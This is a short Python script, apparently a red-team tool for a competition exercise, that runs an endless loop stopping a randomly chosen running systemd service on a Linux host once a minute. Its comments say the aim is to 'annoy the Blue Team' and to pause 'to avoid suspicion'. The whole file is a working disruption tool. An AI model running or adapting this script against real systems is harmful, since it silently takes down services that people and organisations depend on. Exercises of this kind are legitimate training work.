import subprocess
import random
import time


def get_services():
    """
    Runs systemctl command on a Linux machine to gather all services that are currently active and running
    """
    output = subprocess.Popen(["systemctl", "--type=service", "--state=running"], stdout=subprocess.PIPE)
    output = output.stdout.read().decode()
    return output

def select_service(list_of_services_string):
    """
    Takes the output of get_services and parses out the relevant service information, specifically returning its name
    """
    service_list = list_of_services_string.split()
    # Sorts through all strings for services
    service_list = [service for service in service_list if ".service" in service]
    # Select service randomly
    total_services = len(service_list)
    service_number = random.randrange(0, total_services)
    selected_service_string = service_list[service_number]
    service_parts = selected_service_string.split()
    service_name = service_parts[0]
    return service_name

def disable_service(service_name):
    """
    Takes a service name and disables it on the machine
    """
    process = subprocess.Popen(["systemctl", "stop", service_name])
    process.communicate()

def wait(time_to_wait):
    """
    Pauses script execution for desired amount of time
    """
    time.sleep(time_to_wait)

def main():
    # Run always to disable services constantly and annoy the Blue Team. 
    while(True):
        # Get new list of services every time so all attackable services are available
        services = get_services()
        # If all services are down, wait to do anything
        if(len(services) == 0):
            wait(300)
            continue
        # Randomly select a service from the service list
        service = select_service(services)
        # Disable the service
        disable_service(service)
        # Wait to avoid suspicion
        wait(60)

main()